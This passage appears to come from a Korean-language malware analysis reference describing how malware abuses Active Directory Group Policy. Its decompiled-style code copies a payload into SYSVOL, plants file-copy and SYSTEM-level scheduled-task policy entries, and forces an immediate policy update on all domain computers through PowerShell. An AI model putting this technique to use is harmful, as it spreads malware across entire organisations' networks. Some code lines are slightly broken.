h_file = CreateFileW(path, 0x40000000, 0x0, 0x0, 0x4, 0x80, 0x0);

p_IGroupPolicyObject->GetFileSysPath(p_IGroupPolicyObject, GPO_SECTION_MACHINE, gpo_machine_path, 0x400);
path = gpo_machine_path;
PathAppendW(path, "Registry.pol");
h_file = CreateFileW(path, 0x40000000, 0x0, 0x0, 0x4, 0x80, 0x0);

p_IGroupPolicyObject->GetFileSysPath(p_IGroupPolicyObject, GPO_SECTION_MACHINE, gpo_machine_path, 0x400);
path = gpo_machine_path;
PathAppendW(path, "comment.cmtx");
h_file = CreateFileW(path, 0x40000000, 0x0, 0x0, 0x4, 0x80, 0x0);

p_IGroupPolicyObject->GetFileSysPath(p_IGroupPolicyObject, GPO_SECTION_MACHINE, gpo_machine_path, 0x400);
path = gpo_machine_path;
PathAppendW(path, "Preferences\\Services");
CreateDirectoryW(path, 0x0);
PathAppendW(path, "Services.xml");
h_file = CreateFileW(path, 0x40000000, 0x0, 0x0, 0x4, 0x80, 0x0);

swprintf(from_path, "\\%s\sysvol\%s\scripts\", domain_name, domain_name);
file_name = PathFindFileNameW(malware_path);
PathAppendW(from_path, file_name);
CopyFileW(malware_path, from_path, 0x0);

p_IGroupPolicyObject->GetFileSysPath(p_IGroupPolicyObject, GPO_SECTION_USER, gpo_user_path, 0x400);
path = gpo_user_path;
PathAppendW(path, "Preferences\\Files");
CreateDirectoryW(path, 0x0);
PathAppendW(path, "Files.xml");
h_file = CreateFileW(path, 0x40000000, 0x0, 0x0, 0x4, 0x80, 0x0);
file_name = PathFindFileNameA)(from_path);
target_path = "%TempDir%"
PathAppendA(target_path, file_name);
// from_path = "\\(domain_name)\sysvol\(domain_name)\scripts\(file_name)"
// target_path = "%TempDir%\\(file_name)"
sprintf(write_buf, format, id, id, sys_time, *guid_table,from_path, target_path);
WriteFile(h_file, write_buf, len, &ret_len, 0x0);

p_IGroupPolicyObject->GetFileSysPath(p_IGroupPolicyObject, GPO_SECTION_USER, gpo_user_path, 0x400);
path = gpo_user_path;
PathAppendW(path, "Preferences\\ScheduledTasks");
CreateDirectoryW(path, 0x0);
PathAppendW(path, "ScheduledTasks.xml");
h_file = CreateFileW(path, 0x40000000, 0x0, 0x0, 0x4, 0x80, 0x0);
sprintf(write_buf, format, id, sys_time, *guid_table,id, "NT_AUTHORITY\SYSTEM", "NT_AUTHORITY\SYSTEM",
		"NT_AUTHORITY\SYSTEM", target_path,PIPE_BUF);
WriteFile(h_file, write_buf, len, &ret_len, 0x0);
```

## Update GPO

### Concept

악성 코드가 Active Directory의 모든 컴퓨터(또는 특정 OU 또는 DN 내의 컴퓨터)에 대해 그룹 정책 업데이트를 즉시 실행하는 데 사용

### Cmdline

Active Directory에서 컴퓨터 객체를 검색.
각 컴퓨터에 대해 그룹 정책 업데이트를 강제로 실행하는 작업을 수행.

`Get-ADComputer -filter * -Searchbase '(default_name)'`
- Active Directory에서 모든 컴퓨터 객체를 검색
- `-Searchbase '(default_name)'` 옵션은 검색을 특정 OU(조직 단위) 또는 DN(구별 이름)에 제한하며, `(default_name)`는 실제 OU 또는 DN 경로로 대체되어야 함.
`Foreach-Object { Invoke-GPUpdate -computer $_.name -force -RandomDelayInMinutes 0}`
- 검색된 각 컴퓨터 객체에 대해 그룹 정책 업데이트를 강제로 실행.
- `Invoke-GPUpdate` 명령은 그룹 정책 업데이트를 실행
- `-computer $_.name` 옵션은 업데이트를 실행할 컴퓨터를 지정
- `-force` 옵션은 업데이트를 즉시 실행하도록 강제
- `-RandomDelayInMinutes 0` 옵션은 업데이트 지연을 0분으로 설정하여 업데이트가 즉시 실행되도록 함.

```
powershell Get-ADComputer -filter * -Searchbase '(default_name)' | Foreach-Object { Invoke-GPUpdate -computer $_.name -force -RandomDelayInMinutes 0}
```

### Example

```c++
CoInitialize(0x0);
// IID_IADs = {FD8256D0-FD15-11CE-ABC4-02608C9E7553}
ADsOpenObject("LDAP://rootDSE", 0x0, 0x0, 0x1, iid_IADs, &p_IADs);
VariantInit(&default_naming_context);
p_IADs->Get(p_IADs, "defaultNamingContext", &default_naming_context);
format = "powershell Get-ADComputer -filter * -Searchbase '%s%' | Foreach-Object { Invoke-GPUpdate -computer $_.name -force -RandomDelayInMinutes 0}";
swprintf(cmdline, format, default_naming_context);
VariantClear(&default_naming_context);
memset(&pi, 0x0, 0x10);
memset(&si, 0x0, 0x44);
si.cb = 0x44;
CreateProcessW(NULL, cmdline, NULL, NULL, 0x1, 0x8000000, NULL, NULL, &si, &pi);
ZwClose(pi.hThread);
ZwClose(pi.hProcess);
```